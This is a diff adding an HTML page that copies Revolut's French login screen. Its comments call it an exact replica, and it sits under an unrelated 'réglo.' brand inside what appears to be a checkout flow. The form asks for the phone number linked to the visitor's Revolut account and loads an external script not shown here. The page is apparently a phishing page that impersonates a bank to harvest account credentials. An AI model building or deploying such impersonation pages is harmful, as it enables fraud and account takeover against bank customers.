@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Revolut - Connexion</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="revolut_theme.css">
+</head>
+<body class="revolut-theme">
+    <!-- Header - Identical to Revolut -->
+    <header class="revolut-header">
+        <div class="revolut-logo">
+            <div class="logo">réglo<span>.</span></div>
+        </div>
+    </header>
+
+    <!-- Main Content - Exact replica -->
+    <main class="revolut-container">
+        <div class="revolut-card">
+            <!-- Added Revolut logo here -->
+            <div class="revolut-auth-logo">
+                <img src="Revolut-Logo.wine.png" alt="Revolut" class="revolut-logo-img">
+            </div>
+            
+            <h1 class="revolut-title">Heureux de vous revoir</h1>
+            <p class="revolut-subtitle">Saisissez le numéro de téléphone associé à votre compte Revolut.</p>
+            
+            <form id="revolut-phone-form"> <!-- Added form element -->
+                <div class="revolut-phone-input">
+                    <label class="revolut-label">Numéro de téléphone</label>
+                    <div class="revolut-input-group">
+                        <div class="revolut-country-select">
+                            <select>
+                                <option value="+33" selected>+33 FR</option>
+                                <option value="+32">+32 BE</option>
+                                <option value="+49">+49 DE</option>
+                                <option value="+44">+44 UK</option>
+                                <option value="+34">+34 ES</option>
+                                <option value="+39">+39 IT</option>
+                                <option value="+41">+41 CH</option>
+                            </select>
+                        </div>
+                        <div class="revolut-phone-field">
+                            <input type="tel" id="revolut-phone" placeholder="Saisissez votre numéro de téléph..." inputmode="numeric" required> <!-- Added id and required -->
+                        </div>
+                    </div>
+                </div>
+                
+                <a href="#" class="revolut-link">Je n'ai plus accès à mon numéro de téléphone</a>
+                
+                <button type="submit" class="revolut-button" id="revolutContinueBtn"> <!-- Changed to type="submit" -->
+                    Continuer
+                    <span class="revolut-loading" id="revolutLoading" style="display: none;">
+                        <span class="revolut-loading-dot"></span>
+                        <span class="revolut-loading-dot"></span>
+                        <span class="revolut-loading-dot"></span>
+                    </span>
+                </button>
+            </form>
+        </div>
+    </main>
+
+    <!-- Footer - Same as original -->
+    <footer class="revolut-footer">
+        <p>Votre demande est en cours de traitement<span id="revolutLoadingDots"></span></p>
+    </footer>
+
+    <script src="checkout_flow.js" defer></script>
+</body>
+</html>
